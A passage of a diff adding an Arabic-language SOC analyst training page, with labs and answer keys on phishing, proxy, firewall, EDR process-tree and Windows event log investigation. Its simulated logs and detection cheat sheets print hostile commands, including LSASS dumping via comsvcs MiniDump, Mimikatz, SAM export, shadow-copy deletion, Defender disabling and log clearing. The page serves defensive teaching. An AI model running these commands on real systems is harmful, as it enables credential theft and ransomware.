+<li>"Sent from my iPhone" لتبرير الأسلوب المختصر.</li>
+<li>مفيش payload ← الـ Email gateway غالباً مش هيمسكه — لازم Awareness و Process (Call-back verification).</li>
+</ul>
+<p><b>Verdict:</b> <span class="badge b-red">BEC / CEO Fraud</span> · MITRE T1566 + T1656 (Impersonation) · <b>Actions:</b> Block sender + Reply-To، Search على باقي فريق الـ Finance، بلّغ الـ CEO الحقيقي و Finance، اقترح: External sender banner + Rule تحذر لو Display name = اسم Executive من دومين خارجي + Process إن أي تحويل يتأكد بمكالمة على رقم معروف.</p>
+<p><b>لو الإيميل جه من دومين الشركة الحقيقي ونفس الأسلوب؟</b> ← احتمال <b>Account Takeover</b> للـ CEO: راجع Sign-in logs، Inbox rules، MFA.</p>
+</div></details>
+</div>
+
+<!-- Sample 3 -->
+<div class="lab">
+<div class="lt">📎 مثال #3 — Malicious Attachment (Macro)</div>
+<p>إيميل من "DHL Express" فيه <code class="i">Shipping_Invoice_88213.docm</code>. الـ SHA256 مش معروف على VirusTotal (0/70). شغّلت olevba:</p>
+<pre>$ olevba Shipping_Invoice_88213.docm
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|<span class="r">AutoExec  |AutoOpen            |Runs when the Word document is opened</span>        |
+|<span class="r">Suspicious|Shell               |May run an executable file or a system command</span>|
+|<span class="r">Suspicious|WScript.Shell       |May run an executable file or a system command</span>|
+|Suspicious|CreateObject        |May create an OLE object                     |
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+|<span class="r">Suspicious|Base64 Strings      |Base64-encoded strings were detected</span>         |
+|IOC       |powershell.exe      |Executable file name                         |
++----------+--------------------+---------------------------------------------+</pre>
+<details class="ans"><summary>اظهر التحليل</summary><div class="body">
+<ul>
+<li><b>VT = 0 ≠ آمن</b> — الملف ممكن يكون جديد/معمول مخصوص (Fresh). لازم Sandbox.</li>
+<li>Macro بيشتغل أوتوماتيك (<code class="i">AutoOpen</code>) ويشغّل <code class="i">powershell.exe</code> عن طريق <code class="i">WScript.Shell</code> مع Base64 = Downloader غالباً.</li>
+<li>في الـ Sandbox هتشوف: <code class="i">WINWORD.EXE → powershell.exe -enc ...</code> ← اتصال بـ IP خارجي ← ملف في %TEMP%.</li>
+<li><b>Actions:</b> Purge + Block hash/sender. EDR: دوّر على <code class="i">winword.exe</code> اللي parent لـ <code class="i">powershell.exe</code> عند أي حد فتح الملف. لو اتنفذ ← Isolate الجهاز فوراً.</li>
+<li>MITRE: T1566.001 → T1204.002 → T1059.005 (VBA) → T1059.001.</li>
+</ul>
+<p><b>Attachments تانية شائعة دلوقتي:</b> لأن مايكروسوفت بتقفل macros للملفات اللي من النت (MOTW)، المهاجمين اتحولوا لـ: <code class="i">.iso/.img</code> (بيكسر MOTW في الإصدارات القديمة) ← جواها <code class="i">.lnk</code> بيشغل <code class="i">rundll32</code>/<code class="i">powershell</code> · <code class="i">.html</code> (HTML Smuggling) · <code class="i">.one</code> (OneNote) · <code class="i">.zip</code> فيها <code class="i">.js/.vbs/.wsf</code> · PDF فيه QR code · <code class="i">.svg</code> فيه JavaScript.</p>
+</div></details>
+</div>
+
+<h3>🚩 Red Flags Cheat Sheet</h3>
+<div class="grid2">
+<div class="card"><h4>في الـ Sender/Headers</h4><ul>
+<li>Lookalike domain: <code class="i">rn</code>→<code class="i">m</code>، <code class="i">0</code>→<code class="i">o</code>، <code class="i">1</code>/<code class="i">l</code>، Punycode <code class="i">xn--</code></li>
+<li>Subdomain trick: <code class="i">microsoft.com.secure-login.xyz</code> (الدومين الحقيقي هو <code class="i">secure-login.xyz</code>)</li>
+<li>Reply-To / Return-Path مختلفين</li>
+<li>SPF/DKIM/DMARC fail</li>
+<li>دومين عمره أيام (WHOIS)</li></ul></div>
+<div class="card"><h4>في المحتوى</h4><ul>
+<li>Urgency / Threat / Reward</li>
+<li>Generic greeting</li>
+<li>Link text ≠ href، shorteners (bit.ly)، open redirect (<code class="i">google.com/url?q=</code>)</li>
+<li>Free hosting: web.app، firebaseapp، pages.dev، workers.dev، ipfs، sharepoint/onedrive مخترق</li>
+<li>Attachment بامتداد مزدوج أو محمي بباسورد (عشان يهرب من الـ scanning)</li></ul></div>
+</div>
+
+<h3>الأدوات</h3>
+<div class="tbl"><table>
+<tr><th>الغرض</th><th>الأدوات</th></tr>
+<tr><td>Header analysis</td><td>MXToolbox Header Analyzer، Google Admin Toolbox Messageheader، PhishTool</td></tr>
+<tr><td>URL / Domain</td><td>urlscan.io، VirusTotal، URLhaus، WHOIS/DomainTools، Cisco Talos، CheckPhish</td></tr>
+<tr><td>IP reputation</td><td>AbuseIPDB، VirusTotal، Shodan، GreyNoise، IPinfo</td></tr>
+<tr><td>Files</td><td>VirusTotal (hash أولاً)، any.run، Joe Sandbox، Hybrid Analysis، olevba/oletools، pdfid/pdf-parser، exiftool</td></tr>
+<tr><td>Decode</td><td>CyberChef، base64 -d</td></tr>
+<tr><td>Hash</td><td><code class="i">Get-FileHash</code> / <code class="i">sha256sum</code></td></tr>
+</table></div>
+</section>
+
+<!-- ===================== PROXY ===================== -->
+<section class="sec" id="proxy">
+<header><h2><span class="num">07</span>Proxy Logs Analysis</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<p>الـ Proxy هو "دفتر حضور" الإنترنت في الشركة: مين زار إيه، امتى، نزّل كام، وبأي برنامج (User-Agent). هو اللي بيجاوب أهم سؤال بعد الـ Phishing: <b>مين داس؟ ومين دخّل باسورده؟</b></p>
+
+<h3>الحقول اللي لازم تفهمها</h3>
+<div class="tbl"><table>
+<tr><th>Field</th><th>بيقولك إيه</th></tr>
+<tr><td class="m">src_ip / user</td><td>مين (اربطه بـ DHCP/AD لو مفيش user)</td></tr>
+<tr><td class="m">method</td><td>GET (زيارة/تحميل) vs <b>POST</b> (إرسال بيانات — Login/Exfil/C2 check-in)</td></tr>
+<tr><td class="m">url / domain</td><td>رايح فين — IP مباشر بدل domain = 🚩</td></tr>
+<tr><td class="m">status</td><td>200 نجح، 302 redirect (بعد POST login غالباً = البيانات اتبعتت)، 403/blocked</td></tr>
+<tr><td class="m">bytes_out / bytes_in</td><td>out كبير = <b>Upload/Exfil</b>. in كبير = <b>Download</b></td></tr>
+<tr><td class="m">category</td><td>Newly Registered / Uncategorized / Malicious / File sharing</td></tr>
+<tr><td class="m">content_type</td><td><code class="i">application/x-msdownload</code> / <code class="i">octet-stream</code> = ملف تنفيذي</td></tr>
+<tr><td class="m">user_agent</td><td>المتصفح vs <code class="i">WindowsPowerShell</code>، <code class="i">curl</code>، <code class="i">python-requests</code>، <code class="i">Microsoft-CryptoAPI</code> (certutil)، <code class="i">Microsoft BITS</code>، UA فاضي/غريب</td></tr>
+<tr><td class="m">action</td><td>allowed / blocked — <b>blocked مش معناه إن مفيش مشكلة</b>: الجهاز حاول = ممكن يكون مصاب</td></tr>
+</table></div>
+
+<div class="lab">
+<div class="lt">🧪 Lab: Proxy log بعد حملة Phishing (من مثال #1 و #3)</div>
+<pre>time      src_ip       user        method url                                                        status bytes_out bytes_in  category          user_agent                                   action
+08:21:03  10.10.5.23   ahmed.ali   GET    https://m365-verify-login.web.app/owa/?u=ahmed.ali@company.com 200   612      18442    NewlyRegistered   Mozilla/5.0 (Windows NT 10.0; Win64) Edg/131  allowed
+08:21:47  10.10.5.23   ahmed.ali   <span class="r">POST</span>   https://m365-verify-login.web.app/owa/submit.php            <span class="r">302</span>   <span class="r">1204</span>     310      NewlyRegistered   Mozilla/5.0 (Windows NT 10.0; Win64) Edg/131  allowed
+08:21:48  10.10.5.23   ahmed.ali   GET    https://outlook.office.com/                                 200   540      90211    Email             Mozilla/5.0 (Windows NT 10.0; Win64) Edg/131  allowed
+08:33:10  10.10.7.41   mona.adel   GET    https://m365-verify-login.web.app/owa/?u=mona.adel@company.com 200   598      18442    NewlyRegistered   Mozilla/5.0 (Windows NT 10.0; Win64) Chrome/131 allowed
+08:40:02  10.10.9.10   omar.f      GET    https://m365-verify-login.web.app/owa/?u=omar.f@company.com  -     0        0        Phishing          Mozilla/5.0 (Windows NT 10.0; Win64) Chrome/131 <span class="g">blocked</span>
+09:02:11  10.10.5.88   sara.n      GET    <span class="r">http://198.51.100.77/upd.exe</span>                                <span class="r">200</span>   402      <span class="r">389120</span>   Uncategorized     <span class="r">Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1</span> allowed
+09:03:00  10.10.5.88   sara.n      POST   http://198.51.100.77/api/v1/status                          200   512      128      Uncategorized     Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)  allowed
+09:04:00  10.10.5.88   sara.n      POST   http://198.51.100.77/api/v1/status                          200   512      128      Uncategorized     Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)  allowed
+09:05:01  10.10.5.88   sara.n      POST   http://198.51.100.77/api/v1/status                          200   512      128      Uncategorized     Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)  allowed
+09:06:00  10.10.5.88   sara.n      POST   http://198.51.100.77/api/v1/status                          200   512      <span class="r">48211</span>    Uncategorized     Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)  allowed
+09:41:37  10.10.5.88   sara.n      POST   https://mega.example/upload/chunk                           200   <span class="r">524288000</span> 1024   FileSharing       Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)  allowed</pre>
+<p><b>الأسئلة:</b> (1) مين دخل الباسورد؟ (2) مين زار بس؟ (3) إيه اللي حصل لـ sara.n؟ (4) إيه الـ IOCs؟</p>
+<details class="ans"><summary>اظهر الإجابة</summary><div class="body">
+<ol>
+<li><b>ahmed.ali</b> (10.10.5.23): GET للصفحة ثم <b>POST لـ submit.php</b> ← 302 redirect لـ outlook الحقيقي = <b>دخّل credentials بنسبة كبيرة جداً</b> ← Compromised account (High). Reset + revoke sessions + راجع sign-ins.</li>
+<li><b>mona.adel</b>: فتحت الصفحة بس مفيش POST ← غالباً ماكملتش. كلّمها للتأكيد + Reset احتياطي. <b>omar.f</b>: اتعمله block ← تمام، بس ده بيأكد إنه داس.</li>
+<li><b>sara.n</b> (10.10.5.88):
+<ul><li>09:02 نزّل <code class="i">upd.exe</code> (389KB) من IP مباشر بـ <b>UA = WindowsPowerShell</b> ← ده الـ macro بتاع مثال #3 اشتغل.</li>
+<li>من 09:03: <b>Beaconing</b> — POST كل <b>60 ثانية بالظبط</b>، نفس الحجم (512/128)، UA قديم مزيف (MSIE 9 على Win 7 — مع إن الجهاز Win10) ← <b>C2</b>.</li>
+<li>09:06 الرد كبر (48KB) ← غالباً <b>Task/Payload</b> جديد من الـ C2.</li>
+<li>09:41 رفع <b>500MB</b> لموقع File sharing بنفس الـ UA المزيف ← <b>Data Exfiltration</b> (T1567.002).</li></ul></li>
+<li>IOCs: <code class="i">m365-verify-login[.]web[.]app</code>، <code class="i">198.51.100[.]77</code>، <code class="i">hxxp://198.51.100[.]77/upd.exe</code>، <code class="i">/api/v1/status</code>، UA <code class="i">MSIE 9.0; Windows NT 6.1</code>.</li>
+</ol>
+<p><b>Response:</b> Isolate 10.10.5.88 فوراً (Critical — exfil حصل)، Block الـ IP والدومينات، شوف مين تاني بيكلم 198.51.100.77، احسب البيانات اللي خرجت، وابدأ IR كامل.</p>
+</div></details>
+</div>
+
+<h3>إزاي تكشف Beaconing (C2)</h3>
+<ul>
+<li><b>Regularity:</b> اتصالات على فترات ثابتة (60s، 300s) — حتى مع jitter (±10-20%) الـ pattern بيبان.</li>
+<li><b>Same size:</b> نفس الـ bytes كل مرة.</li>
+<li><b>Rare destination:</b> دومين/IP محدش تاني في الشركة بيكلمه.</li>
+<li><b>Odd UA</b>، IP مباشر، دومين جديد، Certificate self-signed، Long connection duration، اتصالات بالليل والجهاز idle.</li>
+<li>⚠️ FPs شائعة: Windows Update، AV updates، Teams/Slack heartbeats، NTP — كلهم periodic بس لدومينات معروفة وكتير من الأجهزة.</li>
+</ul>
+</section>
+
+<!-- ===================== FIREWALL ===================== -->
+<section class="sec" id="firewall">
+<header><h2><span class="num">08</span>Firewall Logs Analysis</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<p>الـ Firewall بيقولك: <b>مين كلم مين، على أنهي port، وسُمح ولا اتمنع، وكام bytes</b>. مفيش محتوى — فإنت بتحلل <b>Patterns</b>.</p>
+
+<h3>Patterns لازم تعرفها</h3>
+<div class="tbl"><table>
+<tr><th>Pattern</th><th>شكله في اللوج</th><th>التفسير</th></tr>
+<tr><td><b>Vertical scan</b></td><td>Src واحد ← Dst واحد ← <b>Ports كتير</b> في ثواني</td><td>Port scan على سيرفر (Nmap)</td></tr>
+<tr><td><b>Horizontal scan / Sweep</b></td><td>Src واحد ← <b>Dsts كتير</b> ← نفس الـ port</td><td>بيدور على خدمة معينة (445 = Worm/Lateral، 3389، 22)</td></tr>
+<tr><td><b>Brute force</b></td><td>Src (أو كذا) ← Dst واحد ← port login (22/3389/445) كتير جداً</td><td>تخمين باسوردات</td></tr>
+<tr><td><b>Beaconing</b></td><td>Internal ← نفس الـ External IP على فترات منتظمة، bytes قليلة</td><td>C2</td></tr>
+<tr><td><b>Exfiltration</b></td><td>Internal ← External، <b>bytes_out ضخمة</b>، وقت غريب (بالليل)</td><td>تسريب بيانات</td></tr>
+<tr><td><b>Policy violation</b></td><td>Internal ← 53 على DNS خارجي (8.8.8.8) بدل الـ DNS الداخلي، أو TOR ports (9001)</td><td>Bypass / Malware / Shadow IT</td></tr>
+<tr><td><b>Allowed inbound لخدمة حساسة</b></td><td>Internet ← 3389/445/22 <b>allow</b></td><td>Misconfiguration = خطر كبير</td></tr>
+</table></div>
+
+<div class="lab">
+<div class="lt">🧪 Lab: حدد كل نشاط</div>
+<pre>date        time      action proto src_ip          sport  dst_ip         dport  bytes      rule
+<span class="c"># --- Block A ---</span>
+2026-11-20  01:14:02  deny   TCP   203.0.113.66    40112  192.0.2.10     21     60         default-deny
+2026-11-20  01:14:02  deny   TCP   203.0.113.66    40112  192.0.2.10     22     60         default-deny
+2026-11-20  01:14:02  deny   TCP   203.0.113.66    40112  192.0.2.10     23     60         default-deny
+2026-11-20  01:14:03  allow  TCP   203.0.113.66    40112  192.0.2.10     80     60         web-in
+2026-11-20  01:14:03  allow  TCP   203.0.113.66    40112  192.0.2.10     443    60         web-in
+2026-11-20  01:14:03  deny   TCP   203.0.113.66    40112  192.0.2.10     445    60         default-deny
+2026-11-20  01:14:03  deny   TCP   203.0.113.66    40112  192.0.2.10     3389   60         default-deny
+   ... (+990 ports في 12 ثانية)
+<span class="c"># --- Block B ---</span>
+2026-11-20  09:31:10  allow  TCP   10.10.5.88      50211  10.10.5.1      445    0          lan-any
+2026-11-20  09:31:10  allow  TCP   10.10.5.88      50212  10.10.5.2      445    0          lan-any
+2026-11-20  09:31:10  allow  TCP   10.10.5.88      50213  10.10.5.3      445    0          lan-any
+   ... (10.10.5.4 → 10.10.5.254)
+2026-11-20  09:31:14  allow  TCP   10.10.5.88      50466  10.10.5.20     445    48211      lan-any
+<span class="c"># --- Block C ---</span>
+2026-11-20  02:37:12  allow  TCP   10.10.8.12      61022  198.51.100.200 443    <span class="r">2486130112</span> web-out
+<span class="c"># --- Block D ---</span>
+2026-11-20  03:00:01  allow  TCP   192.0.2.77      51515  192.0.2.15     3389   1840       <span class="r">rdp-temp-any</span>
+2026-11-20  03:00:03  allow  TCP   198.51.100.31   40400  192.0.2.15     3389   1840       rdp-temp-any
+   ... (4,200 اتصال من 380 IP مختلف خلال ساعة)
+<span class="c"># --- Block E ---</span>
+2026-11-20  10:00:00  allow  UDP   10.10.4.50      53001  8.8.8.8        53     6400       dns-any
+2026-11-20  10:00:00  allow  UDP   10.10.4.50      53002  8.8.8.8        53     6400       dns-any   (× 3000/ساعة)</pre>
+<details class="ans"><summary>اظهر الإجابة</summary><div class="body">
+<ul>
+<li><b>A — Vertical Port Scan</b> من الإنترنت على 192.0.2.10 (ports كتير في ثواني من نفس الـ source port = SYN scan). الـ Firewall منع كله ما عدا 80/443 (مسموح أصلاً). Severity <b>Low</b>: Block الـ IP، وراقب أي web attack جاي منه (Recon غالباً قبل هجوم). MITRE T1595/T1046.</li>
+<li><b>B — Internal Horizontal Scan على SMB 445</b> من <b>10.10.5.88</b> (نفس جهاز sara المصاب!) ← Discovery/Lateral movement أو Worm. وفي اتصال ناجح بـ data لـ 10.10.5.20 ← لازم تشيك على 10.10.5.20 كمان. <b>High</b>. MITRE T1046 → T1021.002.</li>
+<li><b>C — Exfiltration محتمل:</b> 2.48 GB outbound الساعة 2:37 الفجر لـ IP خارجي على 443. شوف: الـ IP ده بتاع مين (Cloud backup شرعي؟)، الجهاز ده إيه، فيه process إيه عملت الاتصال (EDR). <b>High</b> لحد ما يثبت العكس. T1041/T1048.</li>
+<li><b>D — RDP مفتوح للإنترنت</b> (rule اسمه "temp-any" — حد نسيه!) + <b>Distributed brute force</b> من 380 IP. ده أخطر finding: <b>Critical misconfiguration</b>. اقفل الـ rule فوراً، راجع 4624 Type 10 على 192.0.2.15 لأي نجاح، فعّل MFA/VPN. T1110 / T1133.</li>
+<li><b>E — DNS لسيرفر خارجي مباشرة</b> بحجم وعدد كبير ← Policy bypass + احتمال <b>DNS Tunneling</b>. شوف DNS queries نفسها (Sysmon 22 / DNS logs). T1071.004.</li>
+</ul>
+</div></details>
+</div>
+
+<h3>Fields أشهر الـ Firewalls</h3>
+<p><b>Palo Alto:</b> <code class="i wrap">src, dst, sport, dport, app, action (allow/deny/drop/reset-both), rule, bytes_sent, bytes_received, session_end_reason, threat_name</code>. <b>FortiGate:</b> <code class="i wrap">srcip, dstip, srcport, dstport, action (accept/deny/close), policyid, sentbyte, rcvdbyte, service, app</code>. <b>Cisco ASA:</b> رسايل زي <code class="i wrap">%ASA-4-106023: Deny tcp src outside:...</code>.</p>
+<div class="callout tip"><b class="t">💡 Deny vs Drop vs Reset</b> Drop = تجاهل بصمت (المهاجم مايعرفش). Reject/Reset = بيرد RST (المهاجم يعرف إن فيه firewall). <code class="i">allow</code> مع <code class="i">bytes=0</code> أو session_end_reason=<code class="i">aged-out</code> = محاولة اتصال ماكملتش.</div>
+</section>
+
+<!-- ===================== EDR ===================== -->
+<section class="sec" id="edr">
+<header><h2><span class="num">09</span>EDR Alerts & Process Tree Analysis</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<p>الـ EDR (CrowdStrike، Defender for Endpoint، SentinelOne، Carbon Black…) بيدّيك <b>Process tree</b>: مين شغّل مين، بأي command line، ووصل لإيه على الشبكة والملفات. <b>السر كله في الـ Parent → Child و الـ Command line.</b></p>
+
+<div class="lab">
+<div class="lt">🧪 Lab: حلل الـ Process Tree ده</div>
+<pre class="tree">Host: FIN-LT-0088 (10.10.5.88)   User: COMPANY\sara.n   Alert: "Suspicious PowerShell spawned by Office"  Severity: High
+
+outlook.exe (4120)
+ └─ <span class="y">winword.exe</span> (6612)  "C:\Users\sara.n\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\X1\Shipping_Invoice_88213.docm"
+     └─ <span class="r">powershell.exe</span> (7004)  -NoP -NonI -W Hidden -Exec Bypass -enc JABjAD0ATgBlAHcALQBPAGIA...
+         ├─ [net]  TCP 198.51.100.77:80  GET /upd.exe
+         ├─ [file] C:\Users\sara.n\AppData\Local\Temp\upd.exe   SHA256: 9f2c...e41a  (unsigned)
+         └─ <span class="r">upd.exe</span> (7120)
+             ├─ cmd.exe /c "whoami /all &amp; net group "Domain Admins" /domain &amp; nltest /dclist:company.local"
+             ├─ <span class="r">schtasks.exe /create /tn "OneDriveUpdate" /tr "C:\Users\sara.n\AppData\Local\Temp\upd.exe" /sc onlogon /f</span>
+             ├─ reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDrv /d "...\upd.exe" /f
+             ├─ <span class="r">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\d.dmp full</span>     (712 = lsass.exe PID)
+             ├─ [net]  TCP 198.51.100.77:443  every ~60s
+             └─ [net]  TCP 10.10.5.0/24:445  (scan)</pre>
+<details class="ans"><summary>اظهر التحليل الكامل</summary><div class="body">
+<div class="tbl"><table>
+<tr><th>الخطوة</th><th>التفسير</th><th>MITRE</th></tr>
+<tr><td>outlook → winword (.docm من Content.Outlook)</td><td>اليوزر فتح attachment من الإيميل</td><td>T1566.001 / T1204.002</td></tr>
+<tr><td>winword → powershell -enc hidden</td><td><b>Office مايشغلش PowerShell طبيعي</b> = Macro خبيث</td><td>T1059.005 → T1059.001، T1027</td></tr>
+<tr><td>Download upd.exe إلى Temp</td><td>Stage 2 payload (unsigned)</td><td>T1105</td></tr>
+<tr><td>whoami / net group "Domain Admins" / nltest</td><td>Discovery — بيدور على الـ admins والـ DCs</td><td>T1033، T1069.002، T1482/T1018</td></tr>
+<tr><td>schtasks onlogon + Run key</td><td>Persistence مزدوجة باسم مقلّد (OneDrive)</td><td>T1053.005، T1547.001</td></tr>
+<tr><td>rundll32 comsvcs.dll MiniDump 712</td><td><b>Credential Dumping من LSASS</b> بأداة ويندوز شرعية (LOLBin)</td><td>T1003.001، T1218.011</td></tr>
+<tr><td>اتصال كل 60s على 443</td><td>C2 beaconing</td><td>T1071.001</td></tr>
+<tr><td>Scan 445 على الـ subnet</td><td>تحضير لـ Lateral movement</td><td>T1046 → T1021.002</td></tr>
+</table></div>
+<p><b>Verdict:</b> <span class="badge b-red">True Positive — Critical</span>. الجهاز مخترق بالكامل والـ credentials اتسرقت (أي حد عامل login على الجهاز ده — خصوصاً admins — hash بتاعه في خطر).</p>
+<p><b>Response:</b></p>
+<ol>
+<li><b>Network isolate</b> الجهاز من الـ EDR (بدون ما تطفيه — عشان الـ memory evidence).</li>
+<li>Kill الـ processes + Quarantine <code class="i">upd.exe</code> و <code class="i">d.dmp</code>.</li>
+<li>Block hash + 198.51.100.77 على FW/Proxy/EDR — و <b>Hunt</b> على باقي الأجهزة بنفس الـ IOCs.</li>
+<li>Reset password لـ sara.n + <b>أي حساب عمل login على الجهاز</b> (خصوصاً privileged)، وفكّر في krbtgt لو Domain Admin اتأثر.</li>
+<li>شيل الـ persistence (scheduled task + Run key)، ثم Reimage.</li>
+<li>Purge الإيميل الأصلي من كل الـ mailboxes، وشوف مين تاني فتحه.</li>
+</ol>
+</div></details>
+</div>
+
+<h3>EDR Detection Categories الشائعة</h3>
+<div class="grid2">
+<div class="card"><h4>Credential Access</h4><ul>
+<li>أي process بيفتح <code class="i">lsass.exe</code> بـ access <code class="i">0x1010</code> / <code class="i">0x1FFFFF</code> (Sysmon 10)</li>
+<li><code class="i">procdump -ma lsass.exe</code>، <code class="i">comsvcs.dll MiniDump</code>، Mimikatz (<code class="i">sekurlsa::logonpasswords</code>)</li>
+<li><code class="i">reg save HKLM\SAM</code> / <code class="i">HKLM\SYSTEM</code>، <code class="i">ntdsutil "ac i ntds" "ifm" "create full c:\temp"</code></li></ul></div>
+<div class="card"><h4>Ransomware Precursors 🔥</h4><ul>
+<li><code class="i">vssadmin delete shadows /all /quiet</code></li>
+<li><code class="i">wmic shadowcopy delete</code></li>
+<li><code class="i">bcdedit /set {default} recoveryenabled no</code></li>
+<li><code class="i">wbadmin delete catalog -quiet</code></li>
+<li>إيقاف services (SQL, backup, AV) + Mass file rename/modify + Ransom note</li></ul></div>
+<div class="card"><h4>Defense Evasion</h4><ul>
+<li><code class="i">Set-MpPreference -DisableRealtimeMonitoring $true</code></li>
+<li><code class="i">Add-MpPreference -ExclusionPath C:\</code></li>
+<li><code class="i">wevtutil cl Security</code> / Event 1102</li>
+<li>Process injection (CreateRemoteThread — Sysmon 8)، Process hollowing</li></ul></div>
+<div class="card"><h4>Lateral Movement</h4><ul>
+<li><code class="i">PsExec</code> ← service <code class="i">PSEXESVC</code> (7045) على الهدف</li>
+<li><code class="i">wmic /node:</code> ← <code class="i">wmiprvse.exe</code> parent على الهدف</li>
+<li>WinRM ← <code class="i">wsmprovhost.exe</code> parent</li>
+<li>RDP ← 4624 Type 10</li></ul></div>
+</div>
+
+<h3>شكل EDR Alert (JSON) — اعرف تقرأه</h3>
+<pre>{
+  "alert": "Credential Dumping via Comsvcs MiniDump",
+  "severity": "critical",
+  "device": { "name": "FIN-LT-0088", "ip": "10.10.5.88", "os": "Windows 11 23H2" },
+  "user": "COMPANY\\sara.n",
+  "process": {
+    "name": "rundll32.exe", "pid": 7340,
+    "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Users\\Public\\d.dmp full",
+    "parent": { "name": "upd.exe", "pid": 7120, "path": "C:\\Users\\sara.n\\AppData\\Local\\Temp\\upd.exe", "signed": false },
+    "integrity_level": "High"
+  },
+  "target_process": "lsass.exe",
+  "mitre": ["T1003.001", "T1218.011"],
+  "action_taken": "detected"     <span class="c">← detected مش blocked! يعني لازم تتدخل إنت</span>
+}</pre>
+</section>
+
+<!-- ===================== WINDOWS EVENTS ===================== -->
+<section class="sec" id="winevents">
+<header><h2><span class="num">10</span>Windows Event Log Investigation</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<h3>Brute Force vs Password Spraying vs Credential Stuffing</h3>
+<div class="tbl"><table>
+<tr><th>النوع</th><th>Pattern</th><th>في اللوج</th></tr>
+<tr><td><b>Brute Force</b></td><td>يوزر واحد ← باسوردات كتير</td><td>4625 كتير لنفس <code class="i">TargetUserName</code> من نفس الـ IP ← غالباً 4740 Lockout</td></tr>
+<tr><td><b>Password Spraying</b></td><td>باسورد واحد (Winter2026!) ← يوزرات كتير</td><td>4625 لـ <b>يوزرات كتير مختلفة</b> من نفس الـ IP، محاولة واحدة لكل يوزر (عشان مايعملش Lockout)</td></tr>
+<tr><td><b>Credential Stuffing</b></td><td>user:pass مسربين من Breach تاني</td><td>Failed كتير لأزواج مختلفة + نسبة نجاح صغيرة، غالباً على Web login</td></tr>
+</table></div>
+<div class="callout info"><b class="t">ℹ️ نقطة دقيقة عن RDP</b> مع NLA مفعّل، محاولات RDP الفاشلة بتظهر غالباً كـ <b>4625 Logon Type 3</b> (مش 10)، والدخول الناجح بيبان <b>4624 Type 10</b> (وقبله Type 3). فماتستغربش لو لقيت brute force على 3389 بـ Type 3.</div>
+
+<div class="lab">
+<div class="lt">🧪 Lab: ابني الـ Timeline واحكي القصة</div>
+<p>Server: <code class="i">FS01</code> (192.0.2.15 — نفس السيرفر اللي RDP بتاعه مفتوح في Firewall Lab)</p>
+<div class="tbl"><table>
+<tr><th>Time (UTC)</th><th>Event ID</th><th>Details</th></tr>
+<tr><td class="m">03:00 → 03:47</td><td class="m">4625 × 4,200</td><td>TargetUserName: administrator, admin, scanner, svc_backup, test ... | LogonType 3 | Sub Status 0xC0000064 (أغلبها) و 0xC000006A (لـ svc_backup) | Source: IPs كتير</td></tr>
+<tr><td class="m">03:47:12</td><td class="m">4624</td><td>svc_backup | <b>LogonType 10</b> | Source 198.51.100.31</td></tr>
+<tr><td class="m">03:47:12</td><td class="m">4672</td><td>svc_backup — Special privileges (SeDebugPrivilege, SeBackupPrivilege…)</td></tr>
+<tr><td class="m">03:49:40</td><td class="m">4720</td><td>New account: <b>support_adm</b> | created by svc_backup</td></tr>
+<tr><td class="m">03:49:58</td><td class="m">4732</td><td>support_adm added to <b>Administrators</b></td></tr>
+<tr><td class="m">03:52:31</td><td class="m">7045</td><td>Service "WinDefendSvc" | ImagePath: <b>C:\ProgramData\svc.exe</b> | StartType: auto</td></tr>
+<tr><td class="m">04:05:10</td><td class="m">4688</td><td><code class="i">vssadmin.exe delete shadows /all /quiet</code></td></tr>
+<tr><td class="m">04:05:44</td><td class="m">4688</td><td><code class="i">C:\ProgramData\svc.exe -path \\FS01\Shares -enc</code></td></tr>
+<tr><td class="m">04:20:02</td><td class="m">1102</td><td>The audit log was cleared | Subject: support_adm</td></tr>
+</table></div>
+<details class="ans"><summary>اظهر القصة والتحليل</summary><div class="body">
+<ol>
+<li><b>Initial Access:</b> Distributed brute force على RDP المفتوح للإنترنت. الـ Sub Status <code class="i">0xC000006A</code> لـ svc_backup = المهاجم وصل ليوزر حقيقي، ونجح 03:47 (T1110 → T1078 / T1133).</li>
+<li><b>Privilege:</b> 4672 ← svc_backup عنده صلاحيات admin (Service account بصلاحيات عالية وباسورد ضعيف + مسموح له RDP = 3 أخطاء configuration).</li>
+<li><b>Persistence:</b> عمل backdoor account <code class="i">support_adm</code> وضافه للـ Administrators (T1136.001، T1098) + Service خبيث باسم مقلّد لـ Defender (T1543.003، T1036).</li>
+<li><b>Impact:</b> مسح الـ Shadow copies (T1490) ثم تشغيل <code class="i">svc.exe -enc</code> على الـ Shares = <b>Ransomware</b> (T1486).</li>
+<li><b>Anti-forensics:</b> مسح الـ Security log (T1070.001).</li>
+</ol>
+<p><b>Verdict:</b> <span class="badge b-red">Critical — Ransomware Incident</span>. <b>Actions:</b> Isolate FS01 فوراً، اقفل rule الـ RDP، Disable svc_backup و support_adm، Block 198.51.100.31 و الـ IPs، Hunt على باقي السيرفرات بـ svc_backup، استرجاع من Backup نضيف (offline)، اللوجز اللي اتمسحت موجودة في الـ SIEM (عشان كده الـ log forwarding مهم!).</p>
+</div></details>
+</div>
+</section>
+
+<!-- ===================== DNS ===================== -->
+<section class="sec" id="dns">
+<header><h2><span class="num">11</span>DNS Logs Analysis</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<div class="grid3">
